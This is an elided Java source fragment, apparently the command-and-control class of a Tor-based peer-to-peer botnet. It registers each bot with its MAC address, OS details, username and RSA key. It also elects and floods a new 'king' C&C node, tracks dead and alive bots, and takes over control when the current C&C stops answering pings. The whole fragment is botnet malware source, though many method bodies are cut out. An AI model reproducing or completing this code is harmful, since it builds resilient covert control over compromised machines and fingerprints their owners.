...
public class Commando {
	...
	public void initializeCeC() {
		...
		Bot bot = new Bot(nServ.getIdHash(), nServ.getMyOnion().toString(), nServ.getMac(), nServ.getOs(), nServ.getVersionOS(), nServ.getArchOS(), nServ.getUsernameOS(), pki.getPubRSAKeyToString(), (nServ.isElegible() + ""));
		bServ.save(bot);
	 ...
	 * @return
	 */
	public boolean newKingDns(OnionAddress ip, String pk) {
		System.out.println("dns nk");
		return nServ.updateDnsInformation(ip, pk);
	}

	public boolean newKingFlood(OnionAddress ip, String pk) {
		String msg = "newking<CC>" + ip + "<CC>" + pk;
		flooding(msg);
		return false;
	}

	public boolean updateKingFlood(OnionAddress ip, String pk) {
	...
	public boolean abdicate() {
		...
		if (b != null) {
			...
			nServ.getCommandConquerOnions().add(new Pairs<OnionAddress, PublicKey>(ip, pki.rebuildPuK(pk)));
			pServ.setNewKing("");
			nServ.setAliveBot(new SyncIpList<OnionAddress, String>());
	...
	public void startFlood(String msg) {
		...
		for (int i = 0; i < nServ.getNeighbours().getSize(); i++) {
			Pairs<OnionAddress, PublicKey> pairs = nServ.getNeighbours().get(i);
	...
	public void startElection() {
		...
		System.out.println(ccList.remove(nServ.getMyOnion().toString()));
	...
	public byte[] syncNeightboursBot(List<String> data) {
		...
		if (!deadBotList.isEmpty()) {
			for (String ipDead : deadBotList) {
				if (nServ.getAliveBot().removeByValue1(new OnionAddress(ipDead)) != null) {
					flag = true;
				} else {
	...
	public void legacy() {
		Boolean b = bReq.pingToCec(nServ.getCommandConquerOnions().get(0).getValue1().toString());
		if (!b) {
			newKingDns(nServ.getMyOnion(), nServ.getPki().getPubRSAKeyToString());
			updateKingFlood(nServ.getMyOnion(), nServ.getPki().getPubRSAKeyToString());
		} else {
